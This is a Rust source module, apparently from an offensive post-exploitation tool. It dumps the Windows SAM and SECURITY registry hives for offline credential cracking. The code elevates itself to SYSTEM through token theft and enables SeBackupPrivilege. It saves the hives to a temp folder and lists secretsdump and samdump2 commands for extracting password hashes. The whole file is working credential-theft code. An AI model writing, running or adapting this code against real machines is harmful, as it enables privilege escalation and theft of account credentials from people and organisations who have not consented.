//! SAM/SECURITY hive dumping
//! Exports SAM and SECURITY registry hives for offline credential cracking.
//! Requires SYSTEM integrity (auto-elevates via token theft).

use crate::error::MemoricError;
use serde_json::{json, Value};

/// Dump SAM and SECURITY registry hives via RegSaveKeyExW
/// Auto-elevates to SYSTEM if insufficient privileges
pub fn dump_sam_hive(args: &Value) -> Result<Value, MemoricError> {
    use windows::core::PCWSTR;
    use windows::Win32::System::Registry::{
        RegCloseKey, RegOpenKeyExW, RegSaveKeyExW, HKEY_LOCAL_MACHINE, KEY_READ,
        REG_STANDARD_FORMAT,
    };

    let output_dir = args
        .get("output_dir")
        .and_then(|v| v.as_str())
        .unwrap_or("C:\\Windows\\Temp");
    let dump_sam = args
        .get("dump_sam")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let dump_security = args
        .get("dump_security")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);

    tracing::warn!("[SAM] Dumping registry hives to {}", output_dir);

    // Ensure output directory exists
    let _ = std::fs::create_dir_all(output_dir);

    // Auto-elevate to SYSTEM
    let _ = crate::privilege::system::elevate_to_system(&json!({}));

    let mut results = Vec::new();

    // Enable SeBackupPrivilege — required for RegSaveKey on SAM/SECURITY
    unsafe {
        let _ = crate::privilege::abuse::enable_privilege("SeBackupPrivilege");
    }

    let hives_to_dump: &[(&str, &str)] = if dump_sam && dump_security {
        &[("SAM", "sam.hive"), ("SECURITY", "security.hive")]
    } else if dump_sam {
        &[("SAM", "sam.hive")]
    } else if dump_security {
        &[("SECURITY", "security.hive")]
    } else {
        return Err(MemoricError::Other(
            "At least one of dump_sam or dump_security must be true".to_string(),
        ));
    };

    unsafe {
        for (key_name, file_name) in hives_to_dump {
            let sub_key: Vec<u16> = format!("{}\0", key_name).encode_utf16().collect();
            let mut hkey = Default::default();

            if RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                PCWSTR(sub_key.as_ptr()),
                0,
                KEY_READ,
                &mut hkey,
            )
            .is_err()
            {
                tracing::warn!(
                    "[SAM] Failed to open {} hive, may need elevated token",
                    key_name
                );
                results.push(serde_json::json!({
                    "hive": key_name,
                    "status": "failed",
                    "error": "RegOpenKeyExW failed — run as SYSTEM with SeBackupPrivilege"
                }));
                continue;
            }

            let file_path = format!("{}\\{}", output_dir, file_name);
            let path_w: Vec<u16> = format!("{}\0", file_path).encode_utf16().collect();

            let save_result =
                RegSaveKeyExW(hkey, PCWSTR(path_w.as_ptr()), None, REG_STANDARD_FORMAT);

            if save_result.0 == 0 {
                let size = std::fs::metadata(&file_path).map(|m| m.len()).unwrap_or(0);
                tracing::info!(
                    "[SAM] Dumped {} hive → {} ({} bytes)",
                    key_name,
                    file_path,
                    size
                );
                results.push(serde_json::json!({
                    "hive": key_name,
                    "status": "success",
                    "path": file_path,
                    "size_bytes": size
                }));
            } else {
                tracing::error!(
                    "[SAM] RegSaveKeyExW failed for {}: {:?}",
                    key_name,
                    save_result
                );
                results.push(serde_json::json!({
                    "hive": key_name,
                    "status": "failed",
                    "error": format!("RegSaveKeyExW failed: {:?}", save_result)
                }));
            }

            let _ = RegCloseKey(hkey);
        }
    }

    let succeeded = results.iter().filter(|r| r["status"] == "success").count();
    Ok(serde_json::json!({
        "success": succeeded > 0,
        "hives_dumped": succeeded,
        "total_hives": results.len(),
        "results": results,
        "output_dir": output_dir,
        "message": if succeeded > 0 {
            format!("Successfully dumped {}/{} hives. Use secretsdump.py or samdump2 to extract hashes.", succeeded, results.len())
        } else {
            "Failed to dump any hives. Ensure you are running with elevated privileges.".to_string()
        },
        "next_steps": [
            "secretsdump.py -sam sam.hive -security security.hive LOCAL",
            "samdump2 sam.hive security.hive",
            "impacket-secretsdump -sam sam.hive -security security.hive LOCAL"
        ]
    }))
}
